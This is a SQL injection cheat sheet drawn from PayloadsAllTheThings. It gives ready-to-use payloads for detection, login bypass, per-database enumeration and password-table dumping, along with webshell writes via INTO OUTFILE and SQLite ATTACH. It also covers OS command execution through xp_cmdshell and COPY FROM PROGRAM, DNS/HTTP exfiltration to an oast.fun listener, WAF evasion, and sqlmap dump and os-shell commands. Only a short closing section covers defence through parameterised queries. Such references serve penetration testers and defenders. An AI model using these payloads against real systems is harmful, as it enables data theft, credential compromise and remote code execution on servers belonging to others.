---
title: "SQL Injection - Payloads, Per-DBMS Enumeration and sqlmap"
category: web
subcategory: sqli
type: cheatsheet
tags: [sqli, sql-injection, union-based, blind-sqli, boolean-based, time-based, error-based, stacked-queries, information-schema, sqlite-master, load-file, xp-cmdshell, sqlmap, tamper, burp, waf-bypass, mysql, postgresql, mssql, oracle]
summary: "Detection probes, auth bypass, per-DBMS fingerprint/enumeration, UNION and blind templates, error-based payloads, stacked-query matrix, and the sqlmap flags that matter."
tools: [sqlmap, burp, ffuf, curl, hashcat]
source:
  name: "PayloadsAllTheThings - SQL Injection"
  url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
related: [nosqli-payloads, command-injection-payloads, lfi-wrappers-and-paths]
---

## Detection probes and reading the response

```sql
-- a bare single quote: if the app concatenates it into a string literal the quote
-- becomes unbalanced and the parser errors -> 500 / SQL error text / blank page
'

-- a bare double quote: catches MySQL/SQLite string literals built with " instead of '
"

-- backtick: only MySQL/MariaDB treat this as an identifier quote, so a backtick-only
-- error is a strong MySQL fingerprint
`

-- rebalance the quote: if ' broke the page and '' fixes it, you are inside a string
''

-- escaped quote: if \' still errors, the backslash is NOT an escape char (Postgres
-- standard_conforming_strings=on, MSSQL) -- doubling '' is the only escape there
\'

-- arithmetic on a numeric parameter: 3-1 returns the id=2 row only if the value is
-- evaluated by SQL, not compared as the literal string "3-1"
3-1

-- same idea, whitespace-free for filters that strip spaces
3/1

-- string concatenation, MySQL-flavoured: 'ad'+'min' is arithmetic in MySQL (=0),
-- so use the ANSI form to prove concatenation happens server-side
'ad'||'min'

-- always-true vs always-false pair: the classic differential. Same length response
-- for both means no injection; different means the boolean reached the WHERE clause
' OR '1'='1
' OR '1'='2

-- numeric differential pair without quotes (unquoted integer context)
1 AND 1=1
1 AND 1=2

-- inline comment probe: MySQL parses /**/ as whitespace, so 1/**/AND/**/1=1 works
-- where spaces are filtered; a non-SQL parser would 404 on the literal string
1/**/AND/**/1=1

-- MySQL versioned comment: only MySQL executes the body of /*!...*/, other engines
-- see a plain comment -> the differential fingerprints MySQL in one request
1/*!50000AND*/1=1

-- trailing comment to kill the rest of the original query (note the trailing space
-- after -- : MySQL requires whitespace/control char after the double dash)
' OR 1=1-- -
' OR 1=1#
' OR 1=1/*
```

```text
# How to read the difference -- pick ONE oracle and stick to it:
#   status code       200 vs 500                 -> unhandled SQL error
#   content-length    differs by a few bytes     -> row count changed
#   body marker       "Welcome back" present/absent
#   redirect          302 to /dashboard vs /login
#   response time     baseline vs baseline+N sec -> time-based only
# Always send the TRUE and FALSE payload back to back; a single request proves nothing
# because caching, CSRF rotation and A/B content also move the length.
```

## Authentication bypass classics

```sql
-- tautology in the username field: the OR makes the WHERE clause true for row 1,
-- the comment removes the password check entirely
admin'-- -
admin'#
admin'/*

-- no valid username needed: OR 1=1 matches every row, the app logs you in as the
-- first row returned (usually the lowest id, usually admin)
' OR 1=1-- -

-- keeps the query shape when the app wraps the value in a LIKE
' OR '1'='1'-- -
%' OR '1'='1'-- -

-- for numeric id-based lookups (no quotes around the parameter)
1 OR 1=1-- -

-- pins the result to the admin row instead of "whatever row 1 is" -- safer when the
-- app takes user[0] and you do not want to log in as a random user
' OR username='admin'-- -

-- LIMIT-pinning: some apps error on multi-row results; LIMIT 1 keeps it single-row
' OR 1=1 LIMIT 1-- -
' OR 1=1 LIMIT 1 OFFSET 1-- -

-- hash-comparison bypass: injects a known password hash so the app's own
-- password_verify() succeeds against a value you chose ("admin" md5 below is an example
-- shape -- substitute the hash of your chosen password in the target's algorithm)
' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -

-- MySQL loose typing: 'abc'=0 is TRUE in non-strict mode, so a numeric comparison
-- against a string column matches everything
' OR 0=0-- -

-- NULL-safe operator avoids NULL poisoning the boolean when a column is NULL
' OR 1 IS NOT NULL-- -

-- second-order: register a user literally named  admin'-- -  then trigger the flow
-- (password reset / profile update) that re-embeds the stored name into a new query
```

## DBMS fingerprinting

```sql
-- MySQL / MariaDB: @@version and VERSION() both exist; the 5.x/8.x/10.x (Maria) split
-- tells you whether information_schema is readable without privileges
' UNION SELECT @@version,2,3-- -
' UNION SELECT VERSION(),USER(),DATABASE()-- -
' AND 1=CONCAT(@@version)-- -            -- forces a type error carrying the version
SELECT @@hostname, @@datadir, @@basedir; -- filesystem layout for later file reads

-- PostgreSQL: version() is a function, current_database() not database()
' UNION SELECT version(),current_user,current_database()-- -
' UNION SELECT NULL,current_setting('data_directory'),NULL-- -   -- needs superuser
SELECT inet_server_addr(), inet_server_port();  -- proves you are on the real server

-- MSSQL: @@VERSION is a global variable, DB_NAME()/SYSTEM_USER are scalar functions
' UNION SELECT @@version,SYSTEM_USER,DB_NAME()-- -
' UNION SELECT NULL,SUSER_SNAME(),NULL-- -        -- login name (may differ from user)
SELECT IS_SRVROLEMEMBER('sysadmin');              -- 1 means xp_cmdshell is reachable

-- Oracle: every SELECT needs a FROM, hence the one-row DUAL table
' UNION SELECT banner,NULL,NULL FROM v$version-- -
' UNION SELECT user,NULL,NULL FROM dual-- -
SELECT * FROM v$instance;                         -- instance name, host, startup time

-- SQLite: no version() function -- sqlite_version() is the giveaway, and a failed
-- call to version() with a successful sqlite_version() confirms SQLite in two requests
' UNION SELECT sqlite_version(),NULL,NULL-- -
SELECT * FROM pragma_database_list;               -- attached db files = local paths

-- engine-agnostic differential: string concatenation syntax differs per engine, so
-- the one that returns "ab" instead of an error names the DBMS
' AND 'a'||'b'='ab'-- -                  -- Postgres, Oracle, SQLite (and MySQL PIPES_AS_CONCAT)
' AND CONCAT('a','b')='ab'-- -           -- MySQL, MSSQL 2012+
' AND 'a'+'b'='ab'-- -                   -- MSSQL

-- error-message fingerprint shortcuts (send and read the error text):
--   "You have an error in your SQL syntax"          -> MySQL
--   "unterminated quoted string at or near"         -> PostgreSQL
--   "Unclosed quotation mark after the character"   -> MSSQL
--   "ORA-01756: quoted string not properly terminated" -> Oracle
--   "unrecognized token"                            -> SQLite
```

## Schema enumeration and data extraction

```sql
-- MySQL: information_schema is an in-memory view over the data dictionary; any user
-- can read it but only sees objects they have some privilege on
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata-- -
' UNION SELECT table_name,table_schema,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'-- -
-- one-request dump: GROUP_CONCAT collapses every row into a single cell, so you get
-- the whole table even when the page only renders one value
' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),NULL,NULL FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),NULL,NULL FROM users-- -
-- 0x3a is ':' as a hex literal -- survives quote filters that strip ' and "
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL-- -   -- needs FILE priv + secure_file_priv unset
' UNION SELECT 1,'<?php system($_GET[0]);?>',3 INTO OUTFILE '/var/www/html/s.php'-- -

-- PostgreSQL: information_schema exists too, but pg_catalog is the native dictionary
-- and is readable even when information_schema views are restricted
' UNION SELECT datname,NULL,NULL FROM pg_database-- -
' UNION SELECT tablename,schemaname,NULL FROM pg_tables WHERE schemaname='public'-- -
' UNION SELECT column_name,data_type,NULL FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT string_agg(usename||':'||passwd,E'\n'),NULL,NULL FROM pg_shadow-- -   -- superuser only
' UNION SELECT pg_read_file('/etc/passwd',0,2000),NULL,NULL-- -   -- pg_read_file needs superuser/pg_read_server_files
' UNION SELECT NULL,NULL,NULL FROM pg_ls_dir('/var/lib/postgresql')-- -
-- large-object file write primitive (superuser): lo_import reads, lo_export writes
SELECT lo_import('/etc/passwd', 13371); SELECT lo_export(13371, '/tmp/out');

-- MSSQL: sysobjects/syscolumns are the legacy names, sys.tables/sys.columns the modern ones
' UNION SELECT name,NULL,NULL FROM master..sysdatabases-- -
' UNION SELECT name,NULL,NULL FROM sysobjects WHERE xtype='U'-- -     -- xtype U = user table
' UNION SELECT name,NULL,NULL FROM syscolumns WHERE id=OBJECT_ID('users')-- -
-- FOR XML PATH('') concatenates rows into one string, the MSSQL GROUP_CONCAT
' UNION SELECT (SELECT name+',' FROM sysobjects WHERE xtype='U' FOR XML PATH('')),NULL,NULL-- -
' UNION SELECT NULL,name,NULL FROM sys.sql_logins-- -                 -- login list + hashes in password_hash
'; EXEC xp_cmdshell 'whoami';-- -                                     -- needs sysadmin + component enabled
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -

-- Oracle: ALL_TABLES is what the current user can see, DBA_TABLES needs DBA
' UNION SELECT table_name,owner,NULL FROM all_tables-- -
' UNION SELECT column_name,data_type,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
-- Oracle folds unquoted identifiers to UPPERCASE, so table_name='users' matches nothing
' UNION SELECT LISTAGG(username,',') WITHIN GROUP (ORDER BY username),NULL,NULL FROM all_users-- -
' UNION SELECT name,spare4,NULL FROM sys.user$-- -      -- 12c password verifier, DBA only

-- SQLite: sqlite_master holds the literal CREATE statements, so one row gives you
-- table name AND every column name AND the types at once
' UNION SELECT name,sql,NULL FROM sqlite_master WHERE type='table'-- -
' UNION SELECT group_concat(name,','),NULL,NULL FROM sqlite_master-- -
' UNION SELECT group_concat(username||':'||password,char(10)),NULL,NULL FROM users-- -
-- ATTACH writes a new database file anywhere the process can write -- webshell primitive
'; ATTACH DATABASE '/var/www/html/s.php' AS s; CREATE TABLE s.p (x TEXT); INSERT INTO s.p VALUES ('<?php system($_GET[0]);?>');-- -
```

## UNION workflow: column count then type matching

```sql
-- Step 1, ORDER BY bisection: ORDER BY N errors once N exceeds the column count,
-- so the last non-erroring N is the number of columns. Binary search it.
' ORDER BY 1-- -
' ORDER BY 8-- -
' ORDER BY 4-- -

-- Step 1 alternative, NULL padding: UNION requires equal column counts, so the first
-- payload that does NOT error has the right arity. NULL is type-compatible with everything.
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL,NULL-- -

-- Oracle needs a FROM on every SELECT
' UNION SELECT NULL,NULL FROM dual-- -

-- Step 2, find which columns are rendered: put a unique marker in each slot; the one
-- you see in the HTML is your output channel
' UNION SELECT 'aaa','bbb','ccc'-- -

-- Step 3, type matching: if a column is int-typed, a string literal errors there.
-- Replace one NULL at a time with 'a' until you find the string-compatible slots.
' UNION SELECT 'a',NULL,NULL-- -
' UNION SELECT NULL,'a',NULL-- -
' UNION SELECT NULL,NULL,'a'-- -

-- Step 4, collapse everything into one string column when only one slot renders
' UNION SELECT NULL,CONCAT(username,':',password),NULL FROM users-- -       -- MySQL/MSSQL
' UNION SELECT NULL,username||':'||password,NULL FROM users-- -             -- PG/Oracle/SQLite

-- cast to text when the visible column is numeric and refuses strings
' UNION SELECT NULL,CAST(username AS VARCHAR(50)),NULL FROM users-- -        -- MSSQL/PG
' UNION SELECT NULL,TO_CHAR(id),NULL FROM users-- -                         -- Oracle

-- UNION ALL skips the DISTINCT pass: faster and preserves duplicate rows
' UNION ALL SELECT NULL,table_name,NULL FROM information_schema.tables-- -
```

## Blind boolean-based

```sql
-- The shape: AND <predicate> -- the page renders normally when the predicate is TRUE
-- and renders the "not found" variant when FALSE. Each request leaks one bit.

-- length first, so you know how many characters to extract
' AND (SELECT LENGTH(password) FROM users WHERE username='admin')=32-- -     -- MySQL/PG/SQLite
' AND (SELECT LEN(password) FROM users WHERE username='admin')=32-- -        -- MSSQL

-- character-at-a-time, MySQL: SUBSTRING is 1-indexed
' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>109-- -      -- binary search: 7 requests/char

-- PostgreSQL: SUBSTR/ASCII identical, but the subselect must be parenthesised
' AND ASCII(SUBSTR((SELECT password FROM users LIMIT 1),1,1))>109-- -

-- MSSQL: SUBSTRING exists, ASCII exists, no LIMIT -> use TOP 1
' AND ASCII(SUBSTRING((SELECT TOP 1 password FROM users),1,1))>109-- -

-- Oracle: SUBSTR + ASCII, rows limited with ROWNUM
' AND ASCII(SUBSTR((SELECT password FROM users WHERE ROWNUM=1),1,1))>109-- -

-- SQLite: unicode() is the ASCII equivalent, substr() is 1-indexed
' AND unicode(substr((SELECT password FROM users LIMIT 1),1,1))>109-- -

-- avoid quotes entirely when ' is filtered: compare hex/char-built strings
' AND SUBSTRING((SELECT database()),1,1)=CHAR(97)-- -
' AND (SELECT HEX(SUBSTRING(password,1,1)) FROM users LIMIT 1)=0x61-- -

-- existence probe: does a table exist? errors vs returns are both usable oracles
' AND (SELECT COUNT(*) FROM users)>0-- -
```

## Blind time-based

```sql
-- The shape: conditional sleep. TRUE -> the response takes N extra seconds.
-- Always measure a baseline first; network jitter under 1s is normal, use 5s+.

-- MySQL: SLEEP() returns 0, so it must sit inside an expression the engine evaluates
' AND SLEEP(5)-- -
' AND IF(1=1,SLEEP(5),0)-- -
' AND (SELECT SLEEP(5) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')-- -
-- BENCHMARK burns CPU instead of sleeping -- works when SLEEP is blacklisted
' AND BENCHMARK(5000000,SHA1('x'))-- -
-- RLIKE catastrophic backtracking: a pure-regex delay with no sleep function at all
' AND 'a' RLIKE CONCAT(REPEAT('(a.*)+',20),'b')-- -

-- PostgreSQL: pg_sleep returns void, so CASE it into a boolean context
' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)IS NOT NULL-- -
'; SELECT pg_sleep(5)-- -                     -- stacked form, simpler when allowed
-- no-function delay: generate_series forces a large scan
' AND (SELECT COUNT(*) FROM generate_series(1,10000000))>0-- -

-- MSSQL: WAITFOR DELAY is a statement, so it needs a statement context (IF or stacked)
'; IF (1=1) WAITFOR DELAY '0:0:5'-- -
'; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE name='admin')='a' WAITFOR DELAY '0:0:5'-- -

-- Oracle: no sleep in plain SQL -- DBMS_PIPE.RECEIVE_MESSAGE blocks on an empty pipe
' AND 1=(CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 1 END)-- -
-- heavy-query fallback when DBMS_PIPE is not granted
' AND 1=(SELECT COUNT(*) FROM all_objects,all_objects,all_objects)-- -

-- SQLite: no sleep function at all -- use a CPU-heavy recursive CTE as the delay
' AND 1=(WITH RECURSIVE c(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM c WHERE x<5000000) SELECT COUNT(*) FROM c)-- -
```

## Error-based extraction

```sql
-- MySQL <8.0 XPATH trick: EXTRACTVALUE rejects a malformed XPath and echoes the
-- offending string in the error message -- ~32 chars per request
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database()),0x7e))-- -
' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)-- -
-- duplicate-key: the GROUP BY on a random-suffixed value collides and the error text
-- contains the full concatenated key
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT database()),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- -
-- MySQL 8: EXTRACTVALUE removed in 8.0.x builds -> use JSON errors or BIGINT overflow
' AND JSON_KEYS((SELECT CONVERT((SELECT database()) USING utf8mb4)))-- -
' AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(database()))s), 18446744073709551610, 18446744073709551610)))-- -

-- PostgreSQL: cast a string to int -- the type error prints the string verbatim
' AND CAST((SELECT current_database()) AS INT)=1-- -
' AND 1=CAST((SELECT string_agg(tablename,',') FROM pg_tables WHERE schemaname='public') AS INT)-- -

-- MSSQL: the conversion error message embeds the value being converted
' AND 1=CONVERT(INT,(SELECT @@version))-- -
' AND 1=CONVERT(INT,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))-- -
' AND 1=(SELECT TOP 1 name FROM sysobjects WHERE xtype='U' FOR XML PATH(''))-- -

-- Oracle: any function that rejects the payload prints it; CTXSYS and XMLType both work
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1))-- -
' AND (SELECT UPPER(XMLType(CHR(60)||CHR(58)||(SELECT user FROM dual)||CHR(62))) FROM dual) IS NOT NULL-- -
' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual))-- -     -- also an OOB DNS primitive

-- SQLite: no rich error channel -- load_extension() errors leak a little, but in
-- practice fall back to boolean/time-based on SQLite
' AND 1=load_extension((SELECT sqlite_version()))-- -
```

## Stacked queries: where they actually work

```text
# Stacked (batched) queries require BOTH the engine and the client driver to allow
# multiple statements in one execute() call. The driver is usually what blocks it.
#
# MySQL      + mysqli_query / PDO(emulated prepares OFF)   NO   (single statement only)
# MySQL      + mysqli_multi_query / PDO with emulation ON  YES
# PostgreSQL + libpq simple query protocol (pg_query)      YES
# PostgreSQL + extended protocol / parameterised           NO
# MSSQL      + ADO / SqlClient / PHP sqlsrv                YES  (this is the classic one)
# Oracle     + OCI                                         NO   (needs an anonymous PL/SQL block)
# SQLite     + sqlite3_exec / PHP PDO exec                 YES
# SQLite     + sqlite3_prepare_v2 (one stmt per prepare)   NO
#
# Test it with a benign delay rather than a destructive statement:
#   '; SELECT pg_sleep(5)-- -            (PG)
#   '; WAITFOR DELAY '0:0:5'-- -         (MSSQL)
# If the response takes 5 extra seconds, stacking works.
```

```sql
-- Oracle has no ; batching, but an anonymous PL/SQL block runs multiple statements
' AND 1=1; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO scott'; END;-- -

-- MSSQL stacked privilege escalation when the login has IMPERSONATE
'; EXECUTE AS LOGIN='sa'; SELECT IS_SRVROLEMEMBER('sysadmin');-- -

-- PostgreSQL stacked RCE via COPY FROM PROGRAM (PG 9.3+, superuser or pg_execute_server_program)
'; CREATE TABLE cmd_out(o text); COPY cmd_out FROM PROGRAM 'id'; SELECT * FROM cmd_out;-- -
```

## Out-of-band (OOB) exfiltration

```sql
-- Use when there is no visible output, no error text, and time-based is too slow.
-- The DBMS makes an outbound DNS/SMB/HTTP request whose hostname carries the data.

-- MSSQL: the UNC path lookup forces a DNS resolution of the attacker hostname
'; DECLARE @q VARCHAR(1024); SET @q='\\'+(SELECT TOP 1 name FROM sysobjects)+'.x.oast.fun\a'; EXEC master..xp_dirtree @q;-- -

-- Oracle: three independent network functions, try each -- ACLs may block only some
' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.x.oast.fun') FROM dual) IS NOT NULL-- -
' AND (SELECT UTL_HTTP.REQUEST('http://'||(SELECT user FROM dual)||'.x.oast.fun') FROM dual) IS NOT NULL-- -
' AND (SELECT DBMS_LDAP.INIT((SELECT user FROM dual)||'.x.oast.fun',80) FROM dual) IS NOT NULL-- -

-- MySQL on Windows: LOAD_FILE on a UNC path triggers an SMB connection (needs FILE priv)
' AND LOAD_FILE(CONCAT('\\\\',(SELECT HEX(password) FROM users LIMIT 1),'.x.oast.fun\\a'))-- -

-- PostgreSQL: COPY TO PROGRAM is the outbound channel (superuser)
'; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).x.oast.fun';-- -

-- Listener: interactsh-client -v  (or Burp Collaborator). Hex-encode the data first --
-- DNS labels are case-insensitive and 63 chars max, so raw passwords get mangled.
```

## WAF and filter bypass mechanics

```sql
-- keyword filters usually strip a literal, once, non-recursively: nest the keyword
-- so the strip reassembles it
SELSELECTECT  ->  SELECT
UNIunionON     ->  UNION

-- case folding: SQL keywords are case-insensitive, naive regexes are not
' UnIoN SeLeCt 1,2,3-- -

-- whitespace substitutes -- all of these are token separators to the SQL lexer
'/**/UNION/**/SELECT/**/1-- -       -- inline comment
'%09UNION%09SELECT%091-- -          -- tab
'%0aUNION%0aSELECT%0a1-- -          -- newline
'%0cUNION%0cSELECT%0c1-- -          -- form feed
'%a0UNION%a0SELECT%a01-- -          -- non-breaking space (MySQL treats it as space in some charsets)
'UNION(SELECT(1),(2))-- -           -- parentheses remove the need for any whitespace

-- MySQL versioned comments execute only on MySQL and hide the keyword from the WAF
'/*!50000UNION*//*!50000SELECT*/1,2,3-- -

-- scientific-notation trick: MySQL tokenises 1.e(...) so UNION need not follow a space
'1.e(UNION SELECT 1)-- -

-- quote-free strings via hex or CHAR(), for filters that block ' and "
SELECT * FROM users WHERE name=0x61646d696e;
SELECT * FROM users WHERE name=CHAR(97,100,109,105,110);

-- equals-free comparison for filters blocking =
' AND SUBSTRING(database(),1,1) LIKE 'a'-- -
' AND SUBSTRING(database(),1,1) REGEXP '^a'-- -
' AND STRCMP(SUBSTRING(database(),1,1),'a')=0-- -

-- AND/OR-free boolean using && and || (URL-encode && as %26%26 or it splits the query string)
' %26%26 1=1-- -
' || 1=1-- -

-- comma-free UNION for filters blocking , -- JOIN builds the column list instead
' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c-- -
-- comma-free SUBSTRING using the FROM..FOR form
' AND SUBSTRING(database() FROM 1 FOR 1)='a'-- -
-- comma-free LIMIT
' UNION SELECT 1,2,3 LIMIT 1 OFFSET 1-- -

-- buffer the WAF out: many inline-inspection WAFs only scan the first N KB of a body
POST /search  with 8KB of junk in an unused parameter before the injected one
```

## sqlmap: the flags that matter

```bash
# baseline: feed it a saved request so cookies, headers and the body shape are exact
sqlmap -r req.txt --batch

# mark the injection point explicitly with * when it is in a path segment or JSON value
sqlmap -u 'https://t/api/user/1*' --batch

# --level raises WHICH places are tested (1 GET/POST, 2 +Cookie, 3 +User-Agent/Referer,
# 4/5 +more headers and more boundary variants). --risk raises WHAT is sent
# (1 safe, 2 +heavy time-based queries, 3 +OR-based payloads that can UPDATE rows).
sqlmap -r req.txt --level=5 --risk=3 --batch

# pin the technique: B=boolean E=error U=union S=stacked T=time Q=inline.
# Dropping T alone makes a run 10x faster when you already know it is not blind-time.
sqlmap -r req.txt --technique=BEU --batch

# pin the DBMS to skip fingerprinting payloads for the other four engines
sqlmap -r req.txt --dbms=postgresql --batch

# --prefix/--suffix hand-build the injection boundary when sqlmap cannot guess the
# quoting/nesting (e.g. inside a nested subquery or a LIKE '%...%')
sqlmap -r req.txt --prefix="')" --suffix="-- -" --batch

# tamper scripts mutate every payload right before it is sent, to defeat a filter
sqlmap -r req.txt --tamper=space2comment,between,randomcase --batch

# enumeration, cheapest first
sqlmap -r req.txt --current-user --current-db --is-dba --batch
sqlmap -r req.txt --dbs --batch
sqlmap -r req.txt -D appdb --tables --batch
sqlmap -r req.txt -D appdb -T users --columns --batch
sqlmap -r req.txt -D appdb -T users -C username,password --dump --batch
sqlmap -r req.txt --dump-all --exclude-sysdbs --batch

# file read/write and OS shell (needs FILE priv / superuser / sysadmin)
sqlmap -r req.txt --file-read=/etc/passwd --batch
sqlmap -r req.txt --file-write=shell.php --file-dest=/var/www/html/s.php --batch
sqlmap -r req.txt --os-shell --batch
sqlmap -r req.txt --sql-query="SELECT version()" --batch
sqlmap -r req.txt --sql-shell --batch

# performance and stealth
sqlmap -r req.txt --threads=10 --batch              # parallel requests (max 10)
sqlmap -r req.txt --delay=1 --timeout=30 --retries=5 # slow down for rate limits
sqlmap -r req.txt --random-agent --batch             # rotate User-Agent
sqlmap -r req.txt --proxy=http://127.0.0.1:8080      # through Burp for inspection
sqlmap -r req.txt --flush-session                    # discard cached findings and retest
sqlmap -r req.txt --csrf-token=csrf --csrf-url=/form # re-fetch a rotating CSRF token
sqlmap -r req.txt --second-url=/profile              # check a DIFFERENT page for the effect
sqlmap -r req.txt --eval="import hashlib; sig=hashlib.md5(id).hexdigest()"  # recompute a signed param
```

```text
# tamper scripts -- what each one does (sqlmap --list-tampers)
apostrophemask         '  ->  UTF-8 fullwidth %EF%BC%87
apostrophenullencode   '  ->  %00%27  (breaks naive byte scanners)
appendnullbyte         appends %00 to the payload (Access, some C parsers truncate)
base64encode           base64s the whole payload (for endpoints that decode it)
between                >  ->  NOT BETWEEN 0 AND ; = -> BETWEEN  AND   (kills > and =)
bluecoat               space -> %09 and = -> LIKE (Blue Coat proxy)
chardoubleencode       double URL-encodes every character
charencode             URL-encodes every character once
charunicodeencode      chars -> %u0053 style unicode escapes (IIS/ASP)
charunicodeescape      chars -> S escapes
commalesslimit         LIMIT 2,3 -> LIMIT 3 OFFSET 2   (MySQL, comma filter)
commalessmid           MID(a,2,1) -> MID(a FROM 2 FOR 1)
commentbeforeparentheses  inserts /**/ before (  (some parsers)
concat2concatws        CONCAT(a,b) -> CONCAT_WS(MID(CHAR(0),0,0),a,b)
charencode             see above
equaltolike            =  ->  LIKE
escapequotes           '  ->  \'
greatest               >  ->  GREATEST(a,b+1)=a
halfversionedmorekeywords  prefixes each keyword with /*!0  (MySQL < 5.1)
ifnull2ifisnull        IFNULL(a,b) -> IF(ISNULL(a),b,a)
ifnull2casewhenisnull  IFNULL(a,b) -> CASE WHEN ISNULL(a) THEN (b) ELSE (a) END
informationschemacomment  appends /**/ after information_schema
least                  >  ->  LEAST(a,b+1)=b+1
lowercase              uppercases -> lowercase keywords
modsecurityversioned   wraps the payload in /*!00000 ... */ (ModSecurity)
modsecurityzeroversioned  wraps in /*!00000 ... */ with a zero version
multiplespaces         adds multiple spaces around SQL keywords
overlongutf8           converts chars to overlong UTF-8 sequences
overlongutf8more       same, applied to every character
percentage             inserts % before each character (ASP/IIS strips it)
plus2concat            + -> CONCAT()  (MSSQL)
plus2fnconcat          + -> {fn CONCAT()} ODBC escape (MSSQL)
randomcase             randomises keyword casing
randomcomments         inserts /**/ inside keywords: U/**/NION
schemasplit            splits db.table across a newline
sp_password            appends sp_password to hide the query from MSSQL logs
space2comment          space -> /**/
space2dash             space -> --\n  (query-comment newline)
space2hash             space -> #\n  (MySQL)
space2morecomment      space -> /**_**/
space2mssqlblank       space -> a random blank char from the MSSQL-valid set
space2mssqlhash        space -> %23%0A (MSSQL)
space2mysqlblank       space -> a random MySQL-valid blank (%09 %0A %0B %0C %0D %A0)
space2mysqldash        space -> --%0A (MySQL)
space2plus             space -> +
space2randomblank      space -> a random valid whitespace char
symboliclogical        AND/OR -> && / ||
unionalltounion        UNION ALL SELECT -> UNION SELECT
unmagicquotes          '  ->  %bf%27 plus a trailing comment (GBK multibyte squeeze)
uppercase              keywords -> UPPERCASE
varnish                adds an X-originating-IP header (Varnish ACL bypass)
versionedkeywords      wraps each keyword in /*!...*/ (MySQL)
versionedmorekeywords  wraps every keyword including non-reserved ones
xforwardedfor          adds a random X-Forwarded-For header (IP-based blocking)
```

## Defence

```text
# The single fix: never build SQL by concatenation. Bind values as PARAMETERS so the
# driver sends the query text and the data over separate channels -- the parser has
# already finished by the time your bytes arrive, so no byte of input can become SQL.
```

```php
<?php
// PHP PDO -- emulation OFF so prepares really happen server-side.
// With ATTR_EMULATE_PREPARES=true PDO string-interpolates client-side and stacked
// queries become possible again, so this flag is load-bearing.
$pdo = new PDO($dsn, $u, $p, [
    PDO::ATTR_EMULATE_PREPARES => false,
    PDO::ATTR_ERRMODE          => PDO::ERRMODE_EXCEPTION,
]);
$st = $pdo->prepare('SELECT id FROM users WHERE username = ? AND password_hash = ?');
$st->execute([$username, $hash]);   // ' OR 1=1-- - is now just a username that does not exist
```

```python
# Python DB-API -- pass the tuple as the SECOND argument to execute().
# cur.execute("... %s" % value) is the bug; cur.execute("... %s", (value,)) is the fix.
cur.execute("SELECT id FROM users WHERE username = %s", (username,))   # psycopg/MySQLdb
cur.execute("SELECT id FROM users WHERE username = ?", (username,))    # sqlite3
```

```java
// Java JDBC -- PreparedStatement compiles the plan before setString() supplies data.
PreparedStatement ps = conn.prepareStatement("SELECT id FROM users WHERE username = ?");
ps.setString(1, username);
```

```text
# What parameters cannot protect, and what to do instead:
#   identifiers (table/column names) and ORDER BY direction cannot be bound --
#     map user input through a hardcoded allowlist: {"name": "u.name", "date": "u.created"}
#   LIMIT/OFFSET in some drivers -- cast to int in the application first
#   LIKE patterns -- bind the value, escape % and _ yourself, keep the wildcards in code
#   dynamic IN () lists -- generate the right number of ? placeholders, bind each element
#
# Defence in depth (none of these replace parameterisation):
#   least privilege: the app's DB user needs SELECT/INSERT/UPDATE on its own schema and
#     nothing else -- no FILE, no superuser, no xp_cmdshell, no COPY FROM PROGRAM
#   turn off multi-statement support in the driver (PDO emulation off, MySQL CLIENT_MULTI_STATEMENTS off)
#   generic error pages: never render the driver's exception -- it is the error-based channel
#   an ORM helps only when you avoid its raw-SQL escape hatches
#     (Django .extra()/.raw(), SQLAlchemy text(), Sequelize sequelize.query())
#   a WAF buys time, not safety -- every bypass in the section above is a WAF bypass
```

## References

- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- https://portswigger.net/web-security/sql-injection
- https://portswigger.net/web-security/sql-injection/cheat-sheet
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
- https://book.hacktricks.xyz/pentesting-web/sql-injection
